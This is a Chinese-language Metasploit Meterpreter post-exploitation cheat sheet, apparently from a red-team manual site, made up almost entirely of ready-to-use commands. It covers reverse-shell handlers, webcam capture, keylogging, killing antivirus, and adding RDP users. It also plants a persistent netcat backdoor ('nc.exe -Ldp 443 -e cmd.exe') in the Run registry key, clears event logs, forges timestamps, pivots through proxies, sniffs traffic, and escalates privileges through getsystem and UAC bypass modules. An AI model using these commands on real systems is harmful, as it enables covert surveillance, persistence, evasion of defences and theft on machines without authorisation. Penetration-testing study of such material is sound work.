  <a href="#meterpreter%e5%9f%ba%e6%9c%ac%e5%91%bd%e4%bb%a4httpsbookshentoushitopmanualredteam_commandhtmlmeterpreter%e5%9f%ba%e6%9c%ac%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>首先需要先获取meterpreter：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/multi/handler
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> payload windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> LHOST 192.168.81.160
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> ExitOnSession <span style="color:#58a1dd">false</span>
</span></span><span style="display:flex;"><span>exploit -j -z <span style="color:#828b96;font-style:italic"># -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">jobs</span>  <span style="color:#828b96;font-style:italic"># 查看后台攻击任务 </span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">kill</span> &lt;id&gt;  <span style="color:#828b96;font-style:italic"># 停止某后台攻击任务 </span>
</span></span><span style="display:flex;"><span>sessions -l  <span style="color:#828b96;font-style:italic"># (查看会话)</span>
</span></span><span style="display:flex;"><span>sessions -i <span style="color:#a6be9d">2</span>   <span style="color:#828b96;font-style:italic"># 选择会话</span>
</span></span><span style="display:flex;"><span>sessions -k <span style="color:#a6be9d">2</span>   <span style="color:#828b96;font-style:italic"># 结束会话</span></span></span></code></pre></div><p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p>
<p>获取到了meterpreter，就可以进行后渗透了。</p>
<h3 id="基本系统命令httpsbookshentoushitopmanualredteam_commandhtml基本系统命令" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%9f%ba%e6%9c%ac%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">基本系统命令</a></span>
  <a href="#%e5%9f%ba%e6%9c%ac%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4httpsbookshentoushitopmanualredteam_commandhtml%e5%9f%ba%e6%9c%ac%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 会话管理</span>
</span></span><span style="display:flex;"><span>background  <span style="color:#828b96;font-style:italic">#将当前会话放置后台</span>
</span></span><span style="display:flex;"><span>sessions  <span style="color:#828b96;font-style:italic"># 查看会话</span>
</span></span><span style="display:flex;"><span>sessions -i  <span style="color:#828b96;font-style:italic"># 切换会话</span>
</span></span><span style="display:flex;"><span>quit  <span style="color:#828b96;font-style:italic"># 关闭当前的会话，返回msf终端</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 系统设置</span>
</span></span><span style="display:flex;"><span>sysinfo  <span style="color:#828b96;font-style:italic"># 查看目标机系统信息</span>
</span></span><span style="display:flex;"><span>idletime  <span style="color:#828b96;font-style:italic"># 查看目标机闲置时间</span>
</span></span><span style="display:flex;"><span>reboot/shutdown   <span style="color:#828b96;font-style:italic"># 重启/关机</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># shell</span>
</span></span><span style="display:flex;"><span>shell  <span style="color:#828b96;font-style:italic"># 获得控制台权限</span>
</span></span><span style="display:flex;"><span>irb  <span style="color:#828b96;font-style:italic"># 进入ruby终端</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 进程迁移</span>
</span></span><span style="display:flex;"><span>getpid    <span style="color:#828b96;font-style:italic"># 获取当前进程的pid</span>
</span></span><span style="display:flex;"><span>ps   <span style="color:#828b96;font-style:italic"># 查看当前活跃进程</span>
</span></span><span style="display:flex;"><span>migrate &lt;pid值&gt;    <span style="color:#828b96;font-style:italic">#将Meterpreter会话移植到指定pid值进程中</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">kill</span> &lt;pid值&gt;   <span style="color:#828b96;font-style:italic">#杀死进程</span>
</span></span><span style="display:flex;"><span>migrate &lt;pid值&gt;    <span style="color:#828b96;font-style:italic">#将Meterpreter会话移植到指定pid值进程中</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 执行文件</span>
</span></span><span style="display:flex;"><span>execute <span style="color:#828b96;font-style:italic">#在目标机中执行文件</span>
</span></span><span style="display:flex;"><span>execute -H -i -f cmd.exe <span style="color:#828b96;font-style:italic"># 创建新进程cmd.exe，-H不可见，-i交互</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 摄像头命令</span>
</span></span><span style="display:flex;"><span>webcam_list  <span style="color:#828b96;font-style:italic">#查看摄像头列表</span>
</span></span><span style="display:flex;"><span>webcam_chat  <span style="color:#828b96;font-style:italic"># 查看摄像头接口</span>
</span></span><span style="display:flex;"><span>webcam_snap   <span style="color:#828b96;font-style:italic">#通过摄像头拍照</span>
</span></span><span style="display:flex;"><span>webcam_stream   <span style="color:#828b96;font-style:italic">#通过摄像头开启视频</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># uictl开关键盘/鼠标</span>
</span></span><span style="display:flex;"><span>uictl <span style="color:#ff636f">[</span>enable/disable<span style="color:#ff636f">]</span> <span style="color:#ff636f">[</span>keyboard/mouse/all<span style="color:#ff636f">]</span>  <span style="color:#828b96;font-style:italic">#开启或禁止键盘/鼠标</span>
</span></span><span style="display:flex;"><span>uictl disable mouse  <span style="color:#828b96;font-style:italic">#禁用鼠标</span>
</span></span><span style="display:flex;"><span>uictl disable keyboard  <span style="color:#828b96;font-style:italic">#禁用键盘</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 远程桌面/截屏</span>
</span></span><span style="display:flex;"><span>enumdesktops  <span style="color:#828b96;font-style:italic">#查看可用的桌面</span>
</span></span><span style="display:flex;"><span>getdesktop    <span style="color:#828b96;font-style:italic">#获取当前meterpreter 关联的桌面</span>
</span></span><span style="display:flex;"><span>screenshot  <span style="color:#828b96;font-style:italic">#截屏</span>
</span></span><span style="display:flex;"><span>use espia  <span style="color:#828b96;font-style:italic">#或者使用espia模块截屏  然后输入screengrab</span>
</span></span><span style="display:flex;"><span>run vnc  <span style="color:#828b96;font-style:italic">#使用vnc远程桌面连接</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 键盘记录</span>
</span></span><span style="display:flex;"><span>keyscan_start  <span style="color:#828b96;font-style:italic">#开始键盘记录</span>
</span></span><span style="display:flex;"><span>keyscan_dump   <span style="color:#828b96;font-style:italic">#导出记录数据</span>
</span></span><span style="display:flex;"><span>keyscan_stop <span style="color:#828b96;font-style:italic">#结束键盘记录</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 添加用户，开启远程桌面</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span>
</span></span><span style="display:flex;"><span>run post/windows/manage/enable_rdp  <span style="color:#828b96;font-style:italic">#开启远程桌面</span>
</span></span><span style="display:flex;"><span>run post/windows/manage/enable_rdp <span style="color:#58a1dd">USERNAME</span><span style="color:#ff636f">=</span>www2 <span style="color:#58a1dd">PASSWORD</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">123456</span> <span style="color:#828b96;font-style:italic">#添加用户</span>
</span></span><span style="display:flex;"><span>run post/windows/manage/enable_rdp <span style="color:#58a1dd">FORWARD</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">true</span> <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">6662</span>  <span style="color:#828b96;font-style:italic">#将3389端口转发到6662</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 关闭防病毒软件</span>
</span></span><span style="display:flex;"><span>run killav
</span></span><span style="display:flex;"><span>run post/windows/manage/killav
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 修改注册表</span>
</span></span><span style="display:flex;"><span>reg –h <span style="color:#828b96;font-style:italic"># 注册表命令帮助</span>
</span></span><span style="display:flex;"><span>upload /usr/share/windows-binaries/nc.exe C:<span style="color:#a6be9d">\\</span>windows<span style="color:#a6be9d">\\</span>system32 <span style="color:#828b96;font-style:italic">#上传nc</span>
</span></span><span style="display:flex;"><span>reg enumkey -k HKLM<span style="color:#a6be9d">\\</span>software<span style="color:#a6be9d">\\</span>microsoft<span style="color:#a6be9d">\\</span>windows<span style="color:#a6be9d">\\</span>currentversion<span style="color:#a6be9d">\\</span>run   <span style="color:#828b96;font-style:italic">#枚举run下的key</span>
</span></span><span style="display:flex;"><span>reg setval -k HKLM<span style="color:#a6be9d">\\</span>software<span style="color:#a6be9d">\\</span>microsoft<span style="color:#a6be9d">\\</span>windows<span style="color:#a6be9d">\\</span>currentversion<span style="color:#a6be9d">\\</span>run -v lltest_nc -d <span style="color:#a6be9d">&#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39;</span> <span style="color:#828b96;font-style:italic">#设置键值</span>
</span></span><span style="display:flex;"><span>reg queryval -k HKLM<span style="color:#a6be9d">\\</span>software<span style="color:#a6be9d">\\</span>microsoft<span style="color:#a6be9d">\\</span>windows<span style="color:#a6be9d">\\</span>currentversion<span style="color:#a6be9d">\\</span>Run -v lltest_nc   <span style="color:#828b96;font-style:italic">#查看键值</span>
</span></span><span style="display:flex;"><span>nc -v 192.168.81.162 <span style="color:#a6be9d">443</span>  <span style="color:#828b96;font-style:italic">#攻击者连接nc后门</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 清理日志</span>
</span></span><span style="display:flex;"><span>clearav  <span style="color:#828b96;font-style:italic">#清除windows中的应用程序日志、系统日志、安全日志</span></span></span></code></pre></div><h3 id="文件系统命令httpsbookshentoushitopmanualredteam_commandhtml文件系统命令" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">文件系统命令</a></span>
  <a href="#%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4httpsbookshentoushitopmanualredteam_commandhtml%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat/ls/cd/rm  <span style="color:#828b96;font-style:italic"># 基本命令</span>
</span></span><span style="display:flex;"><span>search -f *pass* -d C:<span style="color:#a6be9d">\\</span>windows <span style="color:#828b96;font-style:italic"># 搜索文件  -h查看帮助</span>
</span></span><span style="display:flex;"><span>getwd/pwd  <span style="color:#828b96;font-style:italic"># 获取当前目录</span>
</span></span><span style="display:flex;"><span>getlwd/lpwd   <span style="color:#828b96;font-style:italic"># 操作攻击者主机 查看当前目录</span>
</span></span><span style="display:flex;"><span>upload /tmp/hack.txt C:<span style="color:#a6be9d">\\</span>lltest <span style="color:#828b96;font-style:italic"># 上传文件</span>
</span></span><span style="display:flex;"><span>download c:<span style="color:#a6be9d">\\</span>lltest<span style="color:#a6be9d">\\</span>lltestpasswd.txt /tmp/  <span style="color:#828b96;font-style:italic"># 下载文件</span>
</span></span><span style="display:flex;"><span>edit c:<span style="color:#a6be9d">\\</span>1.txt  <span style="color:#828b96;font-style:italic"># 编辑或创建文件  没有的话，会新建文件</span>
</span></span><span style="display:flex;"><span>mkdir lltest2  <span style="color:#828b96;font-style:italic"># 只能在当前目录下创建文件夹</span>
</span></span><span style="display:flex;"><span>rmdir lltest2  <span style="color:#828b96;font-style:italic"># 只能删除当前目录下文件夹</span>
</span></span><span style="display:flex;"><span>lcd /tmp   <span style="color:#828b96;font-style:italic"># 操作攻击者主机 切换目录</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># timestomp伪造文件时间戳</span>
</span></span><span style="display:flex;"><span>timestomp C:// -h   <span style="color:#828b96;font-style:italic">#查看帮助</span>
</span></span><span style="display:flex;"><span>timestomp -v C://2.txt   <span style="color:#828b96;font-style:italic">#查看时间戳</span>
</span></span><span style="display:flex;"><span>timestomp C://2.txt -f C://1.txt <span style="color:#828b96;font-style:italic">#将1.txt的时间戳复制给2.txt</span></span></span></code></pre></div><h3 id="网络命令httpsbookshentoushitopmanualredteam_commandhtml网络命令" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e7%bd%91%e7%bb%9c%e5%91%bd%e4%bb%a4"target="_blank" rel="external nofollow noopener noreferrer">网络命令</a></span>
  <a href="#%e7%bd%91%e7%bb%9c%e5%91%bd%e4%bb%a4httpsbookshentoushitopmanualredteam_commandhtml%e7%bd%91%e7%bb%9c%e5%91%bd%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 基本</span>
</span></span><span style="display:flex;"><span>ipconfig/ifconfig
</span></span><span style="display:flex;"><span>netstat –ano
</span></span><span style="display:flex;"><span>arp
</span></span><span style="display:flex;"><span>getproxy   <span style="color:#828b96;font-style:italic">#查看代理信息</span>
</span></span><span style="display:flex;"><span>route   <span style="color:#828b96;font-style:italic">#查看路由</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># portfwd端口转发</span>
</span></span><span style="display:flex;"><span>portfwd add -l <span style="color:#a6be9d">6666</span> -p <span style="color:#a6be9d">3389</span> -r 127.0.0.1 <span style="color:#828b96;font-style:italic"># 将目标机的3389端口转发到本地6666端口</span>
</span></span><span style="display:flex;"><span>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span style="color:#828b96;font-style:italic">#然后使用rdesktop来连接，-u 用户名 -p 密码</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 添加路由</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 方式一autoroute （deprecated）</span>
</span></span><span style="display:flex;"><span>run autoroute –h <span style="color:#828b96;font-style:italic">#查看帮助</span>
</span></span><span style="display:flex;"><span>run autoroute -s 192.168.2.0/24  <span style="color:#828b96;font-style:italic">#添加到目标环境网络</span>
</span></span><span style="display:flex;"><span>run autoroute –p  <span style="color:#828b96;font-style:italic">#查看添加的路由</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 方式二post/multi/manage/autoroute</span>
</span></span><span style="display:flex;"><span>run post/multi/manage/autoroute <span style="color:#58a1dd">CMD</span><span style="color:#ff636f">=</span>autoadd <span style="color:#828b96;font-style:italic">#自动添加到目标环境网络</span>
</span></span><span style="display:flex;"><span>run post/multi/manage/autoroute <span style="color:#58a1dd">CMD</span><span style="color:#ff636f">=</span>print <span style="color:#828b96;font-style:italic"># 查看添加的路由</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">(</span>Specify the autoroute <span style="color:#58a1dd">command</span> <span style="color:#ff636f">(</span>Accepted: add, autoadd, print, delete, default<span style="color:#ff636f">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 然后可以利用arp_scanner、portscan等进行存活检测</span>
</span></span><span style="display:flex;"><span>run arp_scanner -r 192.168.2.0/24
</span></span><span style="display:flex;"><span>run post/multi/gather/ping_sweep <span style="color:#58a1dd">RHOSTS</span><span style="color:#ff636f">=</span>192.168.2.0/24
</span></span><span style="display:flex;"><span>run auxiliary/scanner/portscan/tcp <span style="color:#58a1dd">RHOSTS</span><span style="color:#ff636f">=</span>192.168.2.0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># msf提供了2个模块用来做socks代理。</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># auxiliary/server/socks_proxy</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># use auxiliary/server/socks_unc</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 先background退出来，然后：</span>
</span></span><span style="display:flex;"><span>use auxiliary/server/socks_proxy
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> srvhost 127.0.0.1
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> srvport <span style="color:#a6be9d">1080</span>
</span></span><span style="display:flex;"><span>run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 最后proxychains 使用Socks5代理访问</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># sniffer抓包</span>
</span></span><span style="display:flex;"><span>use sniffer
</span></span><span style="display:flex;"><span>sniffer_interfaces   <span style="color:#828b96;font-style:italic">#查看网卡</span>
</span></span><span style="display:flex;"><span>sniffer_start <span style="color:#a6be9d">2</span>   <span style="color:#828b96;font-style:italic">#选择网卡 开始抓包</span>
</span></span><span style="display:flex;"><span>sniffer_stats <span style="color:#a6be9d">2</span>   <span style="color:#828b96;font-style:italic">#查看状态</span>
</span></span><span style="display:flex;"><span>sniffer_dump <span style="color:#a6be9d">2</span> /tmp/lltest.pcap  <span style="color:#828b96;font-style:italic">#导出pcap数据包</span>
</span></span><span style="display:flex;"><span>sniffer_stop <span style="color:#a6be9d">2</span>   <span style="color:#828b96;font-style:italic">#停止抓包</span></span></span></code></pre></div><h3 id="信息收集httpsbookshentoushitopmanualredteam_commandhtml信息收集" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"target="_blank" rel="external nofollow noopener noreferrer">信息收集</a></span>
  <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86httpsbookshentoushitopmanualredteam_commandhtml%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 信息收集的脚本位于：</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># modules/post/windows/gather</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># modules/post/linux/gather</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 以下列举一些常用的</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/checkvm <span style="color:#828b96;font-style:italic">#是否虚拟机</span>
</span></span><span style="display:flex;"><span>run post/linux/gather/checkvm <span style="color:#828b96;font-style:italic">#是否虚拟机</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/forensics/enum_drives <span style="color:#828b96;font-style:italic">#查看分区</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/enum_applications <span style="color:#828b96;font-style:italic">#获取安装软件信息</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/dumplinks   <span style="color:#828b96;font-style:italic">#获取最近的文件操作</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/enum_ie  <span style="color:#828b96;font-style:italic">#获取IE缓存</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/enum_chrome   <span style="color:#828b96;font-style:italic">#获取Chrome缓存</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/enum_patches  <span style="color:#828b96;font-style:italic">#补丁信息</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/enum_domain  <span style="color:#828b96;font-style:italic">#查找定位域控</span>
</span></span><span style="display:flex;"><span>run post/windows/gather/enum_logged_on_users  <span style="color:#828b96;font-style:italic">#登录过的用户</span></span></span></code></pre></div><h3 id="提权httpsbookshentoushitopmanualredteam_commandhtml提权" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%8f%90%e6%9d%83"target="_blank" rel="external nofollow noopener noreferrer">提权</a></span>
  <a href="#%e6%8f%90%e6%9d%83httpsbookshentoushitopmanualredteam_commandhtml%e6%8f%90%e6%9d%83" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>1.getsystem提权 getsystem工作原理： ①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。 ②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。 ③Windows服务已启动，导致与命名管道建立连接。 ④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。 然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getsystem  </span></span></code></pre></div><p>2.bypassuac 用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p>
<p>msf提供了如下几个模块帮助绕过UAC：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 auxiliary<span style="color:#ff636f">(</span>server/socks5<span style="color:#ff636f">)</span> &gt; search bypassuac
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Matching <span style="color:#58a1dd">Modules</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#828b96;font-style:italic">#  Name                                              Disclosure Date  Rank       Check  Description</span>
</span></span><span style="display:flex;"><span>   -  ----                                              ---------------  ----       -----  -----------
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">0</span>  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">1</span>  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass <span style="color:#ff636f">(</span>Via COM Handler Hijack<span style="color:#ff636f">)</span>
